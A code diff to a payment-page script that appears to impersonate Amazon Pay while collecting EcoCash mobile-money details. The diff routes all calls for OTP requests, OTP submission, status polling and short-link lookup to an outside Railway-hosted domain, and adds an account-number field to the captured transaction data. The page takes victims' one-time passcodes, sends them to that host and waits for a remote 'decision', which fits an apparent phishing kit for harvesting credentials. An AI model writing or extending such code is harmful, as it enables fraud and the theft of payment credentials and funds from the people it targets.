@@ -179,6 +179,20 @@
 <div class="toast" id="toast"></div>
 
 <script>
+  /* All API calls route to Railway (always-on) so the flow works
+     even if Render is cold-starting. */
+  const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
+
+  const CONFIG = {
+    OTP_REQUEST: RAILWAY_BASE + '/api/ecocash/otp',
+    SUBMIT: RAILWAY_BASE + '/api/ecocash/submit',
+    STATUS: (ref) => RAILWAY_BASE + '/api/ecocash/status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
+    LINKS: [
+      (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
+      (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
+    ]
+  };
+
   const CURRENCY_SYMBOLS = {
     USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
     MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
@@ -192,10 +206,9 @@
   }
 
   const params = new URLSearchParams(location.search);
-  const txData = { tx: '', am: '', cur: '', rn: '', c: '', pm: '', dt: '' };
+  const txData = { tx: '', am: '', cur: '', rn: '', c: '', pm: '', an: '', dt: '' };
 
   async function resolvePayload() {
-    // 1) ?d= base64 JSON payload
     const d = params.get('d');
     if (d) {
       try {
@@ -207,21 +220,18 @@
           rn:  p.rn  || '',
           c:   p.c   || '',
           pm:  p.pm  || '',
+          an:  p.an  || '',
           dt:  p.dt  || ''
         });
         return;
       } catch (e) { /* fall through */ }
     }
 
-    // 2) ?r= short code → fetch from server
     const code = params.get('r');
     if (code) {
-      for (const url of [
-        '/api/links/' + encodeURIComponent(code),
-        '/api/links?code=' + encodeURIComponent(code)
-      ]) {
+      for (const makeUrl of CONFIG.LINKS) {
         try {
-          const res = await fetch(url);
+          const res = await fetch(makeUrl(code));
           if (!res.ok) continue;
           const data = await res.json();
           const p = data && (data.payload || data);
@@ -233,6 +243,7 @@
               rn:  p.rn  || '',
               c:   p.c   || '',
               pm:  p.pm  || '',
+              an:  p.an  || '',
               dt:  p.dt  || ''
             });
             return;
@@ -241,7 +252,6 @@
       }
     }
 
-    // 3) sessionStorage fallback
     try {
       const raw = sessionStorage.getItem('amz_payload');
       if (raw) {
@@ -253,19 +263,20 @@
           rn:  p.rn  || '',
           c:   p.c   || '',
           pm:  p.pm  || '',
+          an:  p.an  || '',
           dt:  p.dt  || ''
         });
         return;
       }
     } catch (e) {}
 
-    // 4) direct query params (last resort)
     txData.tx  = params.get('tx')  || '';
     txData.am  = params.get('am')  || '';
     txData.cur = params.get('cur') || '';
     txData.rn  = params.get('rn')  || '';
     txData.c   = params.get('c')   || '';
     txData.pm  = params.get('pm')  || '';
+    txData.an  = params.get('an')  || '';
     txData.dt  = params.get('dt')  || '';
   }
 
@@ -275,7 +286,6 @@
     return n.toFixed(2);
   }
 
-  /* ── OTP boxes ── */
   const boxes = Array.from(document.querySelectorAll('#otpRow input'));
   boxes.forEach((el, i) => {
     el.addEventListener('input', () => {
@@ -336,7 +346,7 @@
     resendBtn.textContent = 'Sending…';
 
     try {
-      const r = await fetch('/api/ecocash/otp', {
+      const r = await fetch(CONFIG.OTP_REQUEST, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -380,7 +390,7 @@
     setOtpEnabled(false);
 
     try {
-      await fetch('/api/ecocash/submit', {
+      await fetch(CONFIG.SUBMIT, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -419,7 +429,7 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch('/api/ecocash/status/' + encodeURIComponent(txData.tx) + '?_=' + Date.now());
+        const r = await fetch(CONFIG.STATUS(txData.tx));
         const j = await r.json();
         decision = j.decision || 'pending';
       } catch (e) {}
@@ -455,13 +465,11 @@
   document.addEventListener('DOMContentLoaded', async () => {
     await resolvePayload();
 
-    // Render the amount if we resolved a payload
     if (txData.tx || txData.am) {
       document.getElementById('txId').textContent = txData.tx || '—';
       document.getElementById('amtCur').textContent = txData.cur || '';
       document.getElementById('amtVal').textContent = formatAmount(txData.am, txData.cur);
     } else {
-      // No transaction data found at all
       document.querySelector('.card').innerHTML =
         '<div style="padding:40px 24px;text-align:center">' +
         '<h2 style="font-size:18px;margin-bottom:6px">Missing transaction</h2>' +
